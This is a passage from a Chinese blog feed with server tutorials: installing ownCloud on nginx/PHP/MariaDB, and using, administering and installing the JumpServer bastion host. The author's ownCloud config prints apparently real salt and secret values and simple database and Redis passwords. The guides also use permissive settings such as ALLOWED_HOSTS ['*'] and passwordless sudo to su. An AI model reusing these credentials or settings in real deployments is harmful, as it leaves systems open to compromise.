#tcp_nopush on; keepalive_timeout 65; #gzip on; gzip on; gzip_min_length 10k; gzip_buffers 4 48k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png; gzip_vary off; gzip_disable &quot;MSIE [1-6]\.&quot;; include /etc/nginx/conf.d/*.conf;&#125; 程序目录** MariaDB 安装目录: /usr/local/mariadb MariaDB 数据库目录：/data/mysql（默认，安装时可更改路径） PHP 安装目录: /usr/local/php Nginx 安装目录： /usr/local/nginx 命令一览 MySQL 或 MariaDB 或 Percona 命令 1/etc/init.d/mysqld (start|stop|restart|status) php命令 1/etc/init.d/php-fpm (start|stop|restart|status) nginx 命令 1nginx -s reload Redis 命令（可选安装） 1/etc/init.d/redis-server (start|stop|restart|status) 网站根目录 默认的网站根目录： /data/www/default 安装owncloud1.下载项目并解压 12wget https://download.owncloud.org/community/owncloud-10.0.10.tar.bz2tar xf owncloud-10.0.10.tar.bz2 &amp;&amp; cd owncloud &amp;&amp; rm -fr /data/www/default/* &amp;&amp; cp -ar * /data/www/default 2.修改项目端口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118$ vim /etc/nginx/conf.d/owncloud-officer.confupstream php-handler &#123; server 127.0.0.1:9000; # Depending on your used PHP version #server unix:/var/run/php5-fpm.sock; #server unix:/var/run/php7-fpm.sock;&#125;server &#123; listen 12312; server_name cloud.example.com; keepalive_timeout 70; # Add headers to serve security related headers # Before enabling Strict-Transport-Security headers please read into this topic first. #add_header Strict-Transport-Security &quot;max-age=15552000; includeSubDomains&quot;; add_header X-Content-Type-Options nosniff; add_header X-Frame-Options &quot;SAMEORIGIN&quot;; add_header X-XSS-Protection &quot;1; mode=block&quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; # Path to the root of your installation root /data/www/default/; location = /robots.txt &#123; allow all; log_not_found off; access_log off; &#125; # The following 2 rules are only needed for the user_webfinger app. # Uncomment it if you&apos;re planning to use this app. #rewrite ^/.well-known/host-meta /public.php?service=host-meta last; #rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last; location = /.well-known/carddav &#123; return 301 $scheme://$host/remote.php/dav; &#125; location = /.well-known/caldav &#123; return 301 $scheme://$host/remote.php/dav; &#125; # set max upload size client_max_body_size 512M; fastcgi_buffers 8 4K; # Please see note 1 fastcgi_ignore_headers X-Accel-Buffering; # Please see note 2 # Disable gzip to avoid the removal of the ETag header # Enabling gzip would also make your server vulnerable to BREACH # if no additional measures are done. See https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=773332 gzip off; # Uncomment if your server is build with the ngx_pagespeed module # This module is currently not supported. #pagespeed off; error_page 403 /core/templates/403.php; error_page 404 /core/templates/404.php; location / &#123; rewrite ^ /index.php$uri; &#125; location ~ ^/(?:build|tests|config|lib|3rdparty|templates|data)/ &#123; return 404; &#125; location ~ ^/(?:\.|autotest|occ|issue|indie|db_|console) &#123; return 404; &#125; location ~ ^/(?:index|remote|public|cron|core/ajax/update|status|ocs/v[12]|updater/.+|ocs-provider/.+|core/templates/40[34])\.php(?:$|/) &#123; fastcgi_split_path_info ^(.+\.php)(/.*)$; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; # necessary for owncloud to detect the contextroot https://github.com/owncloud/core/blob/v10.0.0/lib/private/AppFramework/Http/Request.php#L603 fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param modHeadersAvailable true; #Avoid sending the security headers twice fastcgi_param front_controller_active true; fastcgi_read_timeout 180; # increase default timeout e.g. for long running carddav/ caldav syncs with 1000+ entries fastcgi_pass php-handler; fastcgi_intercept_errors on; fastcgi_request_buffering off; #Available since NGINX 1.7.11 &#125; location ~ ^/(?:updater|ocs-provider)(?:$|/) &#123; try_files $uri $uri/ =404; index index.php; &#125; # Adding the cache control header for js and css files # Make sure it is BELOW the PHP block location ~ \.(?:css|js)$ &#123; try_files $uri /index.php$uri$is_args$args; add_header Cache-Control &quot;max-age=15778463&quot;; # Add headers to serve security related headers (It is intended to have those duplicated to the ones above) # Before enabling Strict-Transport-Security headers please read into this topic first. #add_header Strict-Transport-Security &quot;max-age=15552000; includeSubDomains&quot;; add_header X-Content-Type-Options nosniff; add_header X-Frame-Options &quot;SAMEORIGIN&quot;; add_header X-XSS-Protection &quot;1; mode=block&quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; # Optional: Don&apos;t log access to assets access_log off; &#125; location ~ \.(?:svg|gif|png|html|ttf|woff|ico|jpg|jpeg|map)$ &#123; add_header Cache-Control &quot;public, max-age=7200&quot;; try_files $uri /index.php$uri$is_args$args; # Optional: Don&apos;t log access to other assets access_log off; &#125;&#125; 服务器配置完成后，启动nginx，便可以在网页浏览器里面访问owncloud。输入ip和端口即可一旦 URL 加载完毕，我们将呈现上述页面。这里，我们将创建管理员用户同时提供数据库信息。当所有信息提供完毕，点击“Finish setup”。我们将被重定向到登录页面，在这里，我们需要输入先前创建的凭据：一旦创建错误，可以删除/data/www/default/config.php文件，重新刷新页面，可以重新配置管理员。 这里提供我的一份配置1234567891011121314151617181920212223242526272829303132333435$ cat ~/owncloud/config.php&lt;?php$CONFIG = array ( &apos;instanceid&apos; =&gt; &apos;oc9wp89saij8&apos;, &apos;passwordsalt&apos; =&gt; &apos;2k4ULPneBUz7kUvz3wOH7uNpYwWiGx&apos;, &apos;secret&apos; =&gt; &apos;97FrWKoVBzNIb3uir89QEEEnKt7IwG4B+Q+Ye2HlYrtda3OZ&apos;, &apos;trusted_domains&apos; =&gt; array ( 0 =&gt; &apos;ip:port&apos;, #自己的ip和端口 ), &apos;datadirectory&apos; =&gt; &apos;/data/www/default/owncloud/data&apos;, &apos;overwrite.cli.url&apos; =&gt; &apos;http://ip:port&apos;, #自己的ip和端口 &apos;dbtype&apos; =&gt; &apos;mysql&apos;, &apos;version&apos; =&gt; &apos;10.0.10.4&apos;, &apos;dbname&apos; =&gt; &apos;owncloud&apos;, &apos;dbhost&apos; =&gt; &apos;localhost&apos;, &apos;dbtableprefix&apos; =&gt; &apos;oc_&apos;, &apos;mysql.utf8mb4&apos; =&gt; true, &apos;dbuser&apos; =&gt; &apos;ocuser&apos;, &apos;dbpassword&apos; =&gt; &apos;owncloud&apos;, &apos;logtimezone&apos; =&gt; &apos;UTC&apos;, &apos;installed&apos; =&gt; true, &apos;files_external_allow_create_new_local&apos; =&gt; &apos;true&apos;, &apos;accounts.enable_medial_search&apos; =&gt; true, &apos;user.search_min_length&apos; =&gt; 2, &apos;memcache.local&apos; =&gt; &apos;\\OC\\Memcache\\Redis&apos;, &apos;redis&apos; =&gt; array ( &apos;host&apos; =&gt; &apos;localhost&apos;, &apos;port&apos; =&gt; 6379, &apos;timeout&apos; =&gt; 0.0, &apos;password&apos; =&gt; &apos;owncloud&apos;, ), &apos;memcache.locking&apos; =&gt; &apos;\\OC\\Memcache\\Redis&apos;,); APACHE报错学习1.如果你打开页面看到如下错误： 1“PHP is apparently set up to strip inline doc blocks. This will make several core apps inaccessible.”这可能是由缓存/加速器造成的，例如 Zend OPcache 或 eAccelerator。打开你的打开php.ini文件，找到：[opcache]，设置为：opcache.enable=0 和 opcache.enable_cli=0。 2.修改配置文件 12345678910111213vim /usr/local/php/etc/php.d/opcache.ini[opcache]zend_extension=/usr/local/php/ext/opcache.soopcache.enable=0opcache.memory_consumption=128opcache.interned_strings_buffer=8opcache.max_accelerated_files=4000opcache.revalidate_freq=60opcache.save_comments=0opcache.fast_shutdown=1opcache.enable_cli=0;opcache.optimization_level=0 3.输入命令重启php Apache 命令 1/etc/init.d/httpd (start|stop|restart|status)]]></content>
      <categories>
        <category>owncloud</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>owncloud-10.0.10.4</tag>
        <tag>php-7.2.11</tag>
        <tag>mariadb-10.2.18</tag>
        <tag>nginx-1.15.5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jumpserver架构]]></title>
    <url>%2Fjpserver3.html</url>
    <content type="text"><![CDATA[架构说明 组件说明Jumpserver现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。 Github Coco实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。 Github Luna现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。 Github problemluna 的页面不启动解决,2222未打开等问题 1rm -f /data/opt/coco/keys/.access_key 重启服务即可， 1234登陆jumpserver，打开会话管理-----&gt;打开终端管理-----&gt;更新即可 用户资产Web 连接资产点击页面左边的 Web 终端： [ 打开资产所在的节点： [ 点击资产名字，就连上资产了，如果显示连接错误，请联系管理员解决 SSH 连接资产咨询管理员 跳板机服务器地址 及 端口 ，使用 ssh 方式输入自己的用户名和密码登录（与Web登录的用户密码一致） [ SSH 主机登出推荐退出主机时使用 exit 命令或者 ctrl + d 退出会话 SFTP 上传文件到 Linux 资产咨询管理员 跳板机服务器地址 及 端口 ，使用 ssh 方式输入自己的用户名和密码登录（与 SSH 登录跳板机的用户密码一致） 连接成功后，可以看到当前拥有权限的资产，打开资产，然后选择系统用户，即可到资产的 /tmp 目录（/tmp 目录为管理员自定义）]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Jumpserver</tag>
        <tag>Coco</tag>
        <tag>Luna</tag>
        <tag>sftp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jumpserver用户使用]]></title>
    <url>%2Fjpserver2.html</url>
    <content type="text"><![CDATA[用户页面通过管理员发送的邮件里面的 Jumpserver 地址登录进行用户初始化 1.0 添加密码及MFA点击设置密码 1要求10位数，必须有大写字母，其他无所谓 12登录名为：您的英文名（全小写）。密码为：您刚设置的密码。 123点击下一步---&gt; 跳过google应用---&gt; 点击下一步----&gt; MFA 到达上图所示界面时，即开始验证MFA，建议使用阿里云的MFA，不要使用google的,所以跳过了这个过程，下面这个是阿里云网址截图的app。 下载阿里云app完毕后，进入app界面（建议不要卸载）。 1234点击----&gt;&gt; 控制台-----&gt;&gt; 虚拟MFA-----&gt;&gt; 点击右上角+，扫描添加MFA，绑定成功返回登录,登录成功后填写个人信息。 1.1 查看个人信息个人信息页面展示了用户的名称、角色、邮件、所属用户组、SSh 公钥、创建日期、最后登录日期和失效日期等信息： 1.2 修改密码在个人信息页面点击”更改密码”按钮，跳转到修改密码页面，正确输入新旧密码，即可完成密码修改: 1.3 设置或禁用 MFA在个人信息页面点击”设置MFA”按钮（设置完成后按钮会禁用MFA），根据提示处理即可，MFA全称是Multi-Factor Authentication，遵循（TOTP）标准（RFC 6238） 1.4 修改 SSH 公钥点击”重置 SSH 密钥”按钮，跳转到修改 SSH 密钥信息页，复制 SSH 密钥信息到指定框中，即可完成 SSH 密钥修改： 查看 SSH 公钥信息： 12$ cat ~/.ssh/id_rsa.pubssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDadDXxxx...... 1.5 查看个人资产自己被授权的资产，增减授权资产的需求请联系管理员]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Jumpserver</tag>
        <tag>MFA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jumpserver管理者使用]]></title>
    <url>%2Fjpserver01.html</url>
    <content type="text"><![CDATA[快速入门必备条件 一台安装好 Jumpserver 系统的可用主机（堡垒机） 一台或多台可用的 Linux、Windows资产设备（被管理的资产） 一、系统设置1.1 基本设置 12# 修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题） 1.2 邮件设置 123# 点击页面上边的&quot;邮件设置&quot; TAB ，进入邮件设置页面# 配置邮件服务后，点击页面的&quot;测试连接&quot;按钮，如果配置正确，Jumpserver 会发送一条测试邮件到您的 SMTP 账号邮箱里面，确定收到测试邮件后点击保存即可使用。 1.3 LDAP设置 1234# 如果不需要使用 ldap 登陆 jumpserver，可以直接跳过，不需要设置# 先测试通过才能保存# DN 和 OU 一定要完整(如DN:cn=Manage,ou=Jumpserver,dc=jumpserver,ou=org)注：可借用第三方 gui 工具查看 ldap 用户的属性，新版本已经支持中文名登录，即cn=中文也可正常使用 1.4 终端设置 1234567# 命令记录保存到 elastic&#123;&quot;default&quot;: &#123;&quot;TYPE&quot;:&quot;server&quot;&#125;, &quot;ali-es&quot;: &#123;&quot;TYPE&quot;: &quot;elasticsearch&quot;, &quot;HOSTS&quot;: [&quot;http://elastic:changeme@localhost:9200&quot;]&#125;&#125;# 录像存储在 oss，Jumpserver 系统设置-终端设置 录像存储&#123;&quot;default&quot;: &#123;&quot;TYPE&quot;: &quot;server&quot;&#125;, &quot;cn-north-1&quot;: &#123;&quot;TYPE&quot;: &quot;s3&quot;, &quot;BUCKET&quot;: &quot;jumpserver&quot;, &quot;ACCESS_KEY&quot;: &quot;&quot;, &quot;SECRET_KEY&quot;: &quot;&quot;, &quot;REGION&quot;: &quot;cn-north-1&quot;&#125;, &quot;ali-oss&quot;: &#123;&quot;TYPE&quot;: &quot;oss&quot;, &quot;BUCKET&quot;: &quot;jumpserver&quot;, &quot;ACCESS_KEY&quot;: &quot;&quot;, &quot;SECRET_KEY&quot;: &quot;&quot;, &quot;ENDPOINT&quot;: &quot;http://oss-cn-hangzhou.aliyuncs.com&quot;&#125;&#125;注：修改后，需要修改在Jumpserver 会话管理-终端管理 修改terminal的配置 录像存储 命令记录，然后重启 Jumpserver 服务 1.5 安全设置 二、创建用户2.1 创建 Jumpserver 用户 1234567# 点击页面左侧“用户列表”菜单下的“用户列表“，进入用户列表页面# 点击页面左上角“创建用户”按钮，进入创建用户页面，（也可以通过右上角导入模版进行用户导入）# 其中，用户名即 Jumpserver 登录账号（具有唯一性，不能重名）。名称为页面右上角用户标识（可重复）# 成功提交用户信息后，Jumpserver 会发送一条设置&quot;用户密码&quot;的邮件到您填写的用户邮箱# 点击邮件中的设置密码链接，设置好密码后，您就可以用户名和密码登录 Jumpserver 了。# 用户首次登录 Jumpserver，会被要求完善用户信息，按照向导操作即可。注：MFA 即 Google Authenticator ，使用此软件需要APP时间与浏览器时间同步 三、创建资产3.1 创建 Linux 资产 3.1.1 编辑资产树 12# 节点不能重名，右击节点可以添加、删除和重命名节点，以及进行资产相关的操作注：如果有 linux 资产和 windows 资产，建议先建立 Linux 节点与 Windows 节点，不然授权时不好处理 3.1.2 创建管理用户 1234567891011121314151617181920212223242526272829# 管理用户是资产上的 root，或拥有 NOPASSWD: ALL sudo 权限的用户，Jumpserver 使用该用户来推送系统用户、获取资产硬件信息等# 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例）(1). 在资产上生成 root 账户的公钥和私钥 $ ssh-keygen -t rsa # 默认会输入公钥和私钥文件到 ~/.ssh 目录(2). 将公钥输出到文件 authorized_keys 文件，并修改权限 $ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys $ chmod 400 ~/.ssh/authorized_keys(3). 打开RSA验证相关设置 $ vim /etc/ssh/sshd_config RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys(4). 重启 ssh 服务 $ service sshd restart(5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中# 这样就可以使用 ssh私钥 进行管理服务器# 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个 3.1.3 创建系统用户 1234567891011121314# 系统用户是 Jumpserver 跳转登录资产时使用的用户，可以理解为登录资产用户# 系统用户的 Sudo 栏设定用户的 sudo 权限# 这里简单举几个例子Sudo /bin/su # 当前系统用户可以免sudo密码执行sudo su命令Sudo /usr/bin/git,/usr/bin/php,/bin/cat,/bin/more,/bin/less,/usr/bin/tail# 当前系统用户可以免sudo密码执行git php cat more less tailSudo !/usr/bin/yum # 禁止执行 yum 权限# 此处的权限应该根据使用用户的需求汇总后定制，原则上给予最小权限即可# 下图为不允许用户执行一些危险的操作，允许其他的所有权限 123456# 系统用户创建时，如果选择了自动推送 Jumpserver 会使用 Ansible 自动推送系统用户到资产中，如果资产(交换机、Windows )不支持 Ansible, 请手动填写资产上已有的账号及账号密码# 如果不想使用 Jumpserver 推送用户，请去掉自动生成密钥、自动推送勾选。手动填写资产上已有的账号及账号密码# 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息 3.1.4 创建资产 1234# 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。# 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。# IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能&quot;牢靠&quot;地登录指定的 IP 主机上。资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。 1234# 资产创建信息填写好保存之后，可测试资产是否能正确连接注：被连接资产需要python组件，且版本大于等于2.6，Ubuntu等资产默认不允许root用户远程ssh登录，请自行处理# 如果资产不能正常连接，请检查管理用户的用户名和密钥是否正确以及该管理用户是否能使用 SSH 从 Jumpserver 主机正确登录到资产主机上 参考 Linux 资产连接说明 3.1.5 网域列表 1234# 网域功能是为了解决部分环境无法直接连接而新增的功能，原理是通过网关服务器进行跳转登录# 点击页面左侧的“网域列表”按钮，查看所有网域列表# 点击页面左上角的“创建网域”按钮，进入网域创建页面，选择资产里用作网域的网关服务器注：混合云适用 1234# 点击网域的名称，进入网域详情列表。# 点击页面的“网关”按钮，选择网关列表的“创建网关”按钮，进入网关创建页面，填写网关信息。# IP信息一般默认填写网域资产的IP即可（如用作网域的资产有多块网卡和IP地址，选能与jumpserer通信的任一IP即可）注：用户名与密码可以使用网关资产上已存在的任一拥有执行 ssh 命令权限的用户 1注：保存信息后点击测试连接，确定设置无误后到资产列表添加需要使用网关登录的资产即可。 3.2 创建 Windows 资产 3.2.1 创建 Windows 系统管理用户 1注：同 Linux 系统的管理用户一样，名称可以按资产树来命名，用户名是管理员用户名，密码是管理员的密码 3.2.2 创建 Windows 系统系统用户 1234# 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放注：Windows 资产协议务必选择 rdp# 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息 3.2.3 创建 Windows 资产 123# 同创建 Linux 资产一样。# 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择，注：确保管理用户能正确登录到指定的 IP 主机上 参考 Windows 资产连接说明 四、资产节点管理4.1 为资产树节点分配资产 1注：在资产列表页面，选择要添加资产的节点，右键，选择添加资产到节点(一台资产可以同时在多个节点下面) 1注：选择要被添加的资产，点击&quot;确认&quot;即可。 4.2 删除节点资产 1注：选择要被删除的节点，选择&quot;从节点删除&quot;，点击&quot;提交&quot;即可。 五、创建授权规则123456# 名称，授权的名称，不能重复# 用户和用户组二选一，不推荐即选择用户又选择用户组# 资产和节点二选一，选择节点会包含节点下面的所有资产# 系统用户，及所选的用户或用户组下的用户能通过该系统用户使用所选节点或者节点下的资产# 用户（组），资产（节点），系统用户是一对一的关系，所以当拥有 Linux、Windows 不同类型资产时，应该分别给 Linux 资产和 Windows 资产创建授权规则。 资产授权与节点授权的区别请参考下面示例，一般情况下，资产授权给个人，节点授权给用户组，一个授权只能选择一个系统用户 1注：创建的授权规则，节点要与资产所在的节点一致 1234# 原则上，一个授权只能同时授予一个用户或者一个组# 意思是：把个人的资产授权给个人，把部门的资产授权给部门，把项目的资产授权给项目...# 职责不同，权限就不同，按照职责制定系统用户# 这样授权就不会乱 六、用户使用资产6.1 登录 Jumpserver 1# 用户只能看到自己被管理员授权了的资产，如果登录后无资产，请联系管理员进行确认 6.2 使用资产 6.2.1 连接资产 1# 点击页面左边的 Web 终端： 1# 打开资产所在的节点： 12# 点击资产名字，就连上资产了，整个过程不需要用户输入资产的任何信息# 如果显示连接超时，请参考FAQ文档进行处理 6.2.2 断开资产 1# 点击页面顶部的 Server 按钮会弹出选个选项，第一个断开所选的连接，第二个断开所有连接。]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Jumpserver</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jumpserver安装]]></title>
    <url>%2Fjpserver1.html</url>
    <content type="text"><![CDATA[CentOS 6 安装文档说明 # 开头的行表示注释 > 开头的行表示需要在 mysql 中执行 $ 开头的行表示需要执行的命令 本文档适用于有一定web运维经验的管理员或者工程师，文中不会对安装的软件做过多的解释，仅对需要执行的内容注部分注释，更详细的内容请参考其他安装。 安装过程中遇到问题可参考 安装过程中常见的问题 环境 系统: CentOS 6 IP: xx.xx.xx.xx 目录: /data/data/opt 数据库: mariadb-10.2.15,用的是开发机上的mysql数据库 代理: nginx 开始安装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# 防火墙 与 selinux 设置说明，如果已经关闭了 防火墙 和 Selinux 的用户请跳过设置# 修改字符集，否则可能报 input/output error的问题，因为日志里打印了中文，目前未修改$ localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8$ export LC_ALL=zh_CN.UTF-8$ echo &apos;LANG=&quot;zh_CN.UTF-8&quot;&apos; &gt; /etc/locale.conf# 安装依赖包$ yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release git# 安装 Redis, Jumpserver 使用 Redis 做 cache 和 celery broke$ yum -y install redis$ chkconfig redis on$ service redis start # 安装 MySQL# 创建数据库 Jumpserver 并授权$ mysql -uroot&gt; create database jumpserver default charset &apos;utf8&apos;;&gt; grant all on jumpserver.* to &apos;jumpserver&apos;@&apos;127.0.0.1&apos; identified by &apos;weakPassword&apos;;&gt; flush privileges;# 安装 Nginx ，用作代理服务器整合 Jumpserver 与各个组件$ yum -y install nginx$ chkconfig nginx on# 下载编译 Python3.6.1$ wget https://www.python.org/ftp/python/3.6.1/Python-3.6.1.tar.xz$ tar xvf Python-3.6.1.tar.xz &amp;&amp; cd Python-3.6.1$ ./configure &amp;&amp; make &amp;&amp; make install# 配置并载入 Python3 虚拟环境$ cd /data/opt$ python3 -m venv py3 # py3 为虚拟环境名称，可自定义$ source /data/opt/py3/bin/activate # 退出虚拟环境可以使用 deactivate 命令# 看到下面的提示符代表成功，以后运行 Jumpserver 都要先运行以上 source 命令，载入环境后默认以下所有命令均在该虚拟环境中运行(py3) [root@localhost py3]# 自动载入 Python3 虚拟环境$ cd /data/opt$ git clone git://github.com/kennethreitz/autoenv.git$ echo &apos;source /data/opt/autoenv/activate.sh&apos; &gt;&gt; ~/.bashrc$ source ~/.bashrc# 下载 Jumpserver 与 Coco$ cd /data/opt/$ git clone https://github.com/jumpserver/jumpserver.git &amp;&amp; cd jumpserver &amp;&amp; git checkout master &amp;&amp; git pull$ echo &quot;source /data/opt/py3/bin/activate&quot; &gt; /data/opt/jumpserver/.env # 进入 jumpserver 目录时将自动载入 python 虚拟环境$ cd /data/opt/$ git clone https://github.com/jumpserver/coco.git &amp;&amp; cd coco &amp;&amp; git checkout master &amp;&amp; git pull$ echo &quot;source /data/opt/py3/bin/activate&quot; &gt; /data/opt/coco/.env # 进入 coco 目录时将自动载入 python 虚拟环境# 安装依赖 RPM 包$ yum -y install $(cat /data/opt/jumpserver/requirements/rpm_requirements.txt)$ yum -y install $(cat /data/opt/coco/requirements/rpm_requirements.txt)# 安装 Python 库依赖$ pip install --upgrade pip$ pip install -r /data/opt/jumpserver/requirements/requirements.txt -i https://pypi.python.org/simple$ pip install -r /data/opt/coco/requirements/requirements.txt -i https://pypi.python.org/simple# 修改 Jumpserver 配置文件$ cd /data/opt/jumpserver$ cp config_example.py config.py$ vi config.py# 注意对齐，不要直接复制本文档的内容，实际内容以文件为准，本文仅供参考 注意: 配置文件是 Python 格式，不要用 TAB，而要用空格 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&quot;&quot;&quot; jumpserver.config ~~~~~~~~~~~~~~~~~ Jumpserver project setting file :copyright: (c) 2014-2017 by Jumpserver Team :license: GPL v2, see LICENSE for more details.&quot;&quot;&quot;import osBASE_DIR = os.path.dirname(os.path.abspath(__file__))class Config: # Use it to encrypt or decrypt data # Jumpserver 使用 SECRET_KEY 进行加密，请务必修改以下设置 # SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;2vym+ky!997d5kkcc64mnz06y1mmui3lut#(^wd=%s_qj$1%x&apos; SECRET_KEY = &apos;请随意输入随机字符串（推荐字符大于等于 50位）&apos; # Django security setting, if your disable debug model, you should setting that ALLOWED_HOSTS = [&apos;*&apos;] # DEBUG 模式 True为开启 False为关闭，默认开启，生产环境推荐关闭 # 注意：如果设置了DEBUG = False，访问8080端口页面会显示不正常，需要搭建 nginx 代理才可以正常访问 DEBUG = os.environ.get(&quot;DEBUG&quot;) or False # 日志级别，默认为DEBUG，可调整为INFO, WARNING, ERROR, CRITICAL，默认INFO LOG_LEVEL = os.environ.get(&quot;LOG_LEVEL&quot;) or &apos;WARNING&apos; LOG_DIR = os.path.join(BASE_DIR, &apos;logs&apos;) # 使用的数据库配置，支持sqlite3, mysql, postgres等，默认使用sqlite3 # See https://docs.djangoproject.com/en/1.10/ref/settings/#databases # 默认使用SQLite3，如果使用其他数据库请注释下面两行 # DB_ENGINE = &apos;sqlite3&apos; # DB_NAME = os.path.join(BASE_DIR, &apos;data&apos;, &apos;db.sqlite3&apos;) # 如果需要使用mysql或postgres，请取消下面的注释并输入正确的信息,本例使用mysql做演示(mariadb也是mysql) DB_ENGINE = os.environ.get(&quot;DB_ENGINE&quot;) or &apos;mysql&apos; DB_HOST = os.environ.get(&quot;DB_HOST&quot;) or &apos;127.0.0.1&apos; DB_PORT = os.environ.get(&quot;DB_PORT&quot;) or 3306 DB_USER = os.environ.get(&quot;DB_USER&quot;) or &apos;jumpserver&apos; DB_PASSWORD = os.environ.get(&quot;DB_PASSWORD&quot;) or &apos;weakPassword&apos; DB_NAME = os.environ.get(&quot;DB_NAME&quot;) or &apos;jumpserver&apos; # Django 监听的ip和端口，生产环境推荐把0.0.0.0修改成127.0.0.1，这里的意思是允许x.x.x.x访问，127.0.0.1表示仅允许自身访问 # ./manage.py runserver 127.0.0.1:8080 HTTP_BIND_HOST = &apos;127.0.0.1&apos; HTTP_LISTEN_PORT = 8080 # Redis 相关设置 REDIS_HOST = os.environ.get(&quot;REDIS_HOST&quot;) or &apos;127.0.0.1&apos; REDIS_PORT = os.environ.get(&quot;REDIS_PORT&quot;) or 6379 REDIS_PASSWORD = os.environ.get(&quot;REDIS_PASSWORD&quot;) or &apos;&apos; REDIS_DB_CELERY = os.environ.get(&apos;REDIS_DB&apos;) or 3 REDIS_DB_CACHE = os.environ.get(&apos;REDIS_DB&apos;) or 4 def __init__(self): pass def __getattr__(self, item): return Noneclass DevelopmentConfig(Config): passclass TestConfig(Config): passclass ProductionConfig(Config): pass# Default using Config settings, you can write if/else for different envconfig = DevelopmentConfig()# 修改 Coco 配置文件$ cd /data/opt/coco$ cp conf_example.py conf.py$ vi conf.py# 注意对齐，不要直接复制本文档的内容 注意: 配置文件是 Python 格式，不要用 TAB，而要用空格 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183#!/usr/bin/env python3# -*- coding: utf-8 -*-#import osBASE_DIR = os.path.dirname(__file__)class Config: &quot;&quot;&quot; Coco config file, coco also load config from server update setting below &quot;&quot;&quot; # 项目名称, 会用来向Jumpserver注册, 识别而已, 不能重复 # NAME = &quot;localhost&quot; NAME = &quot;coco&quot; # Jumpserver项目的url, api请求注册会使用, 如果Jumpserver没有运行在127.0.0.1:8080，请修改此处 # CORE_HOST = os.environ.get(&quot;CORE_HOST&quot;) or &apos;http://127.0.0.1:8080&apos; CORE_HOST = &apos;http://127.0.0.1:8080&apos; # 启动时绑定的ip, 默认 0.0.0.0 # BIND_HOST = &apos;0.0.0.0&apos; # 监听的SSH端口号, 默认2222 # SSHD_PORT = 2222 # 监听的HTTP/WS端口号，默认5000 # HTTPD_PORT = 5000 # 项目使用的ACCESS KEY, 默认会注册,并保存到 ACCESS_KEY_STORE中, # 如果有需求, 可以写到配置文件中, 格式 access_key_id:access_key_secret # ACCESS_KEY = None # ACCESS KEY 保存的地址, 默认注册后会保存到该文件中 # ACCESS_KEY_STORE = os.path.join(BASE_DIR, &apos;keys&apos;, &apos;.access_key&apos;) # 加密密钥 # SECRET_KEY = None # 设置日志级别 [&apos;DEBUG&apos;, &apos;INFO&apos;, &apos;WARN&apos;, &apos;ERROR&apos;, &apos;FATAL&apos;, &apos;CRITICAL&apos;] # LOG_LEVEL = &apos;INFO&apos; LOG_LEVEL = &apos;WARN&apos; # 日志存放的目录 # LOG_DIR = os.path.join(BASE_DIR, &apos;logs&apos;) # Session录像存放目录 # SESSION_DIR = os.path.join(BASE_DIR, &apos;sessions&apos;) # 资产显示排序方式, [&apos;ip&apos;, &apos;hostname&apos;] # ASSET_LIST_SORT_BY = &apos;ip&apos; # 登录是否支持密码认证 # PASSWORD_AUTH = True # 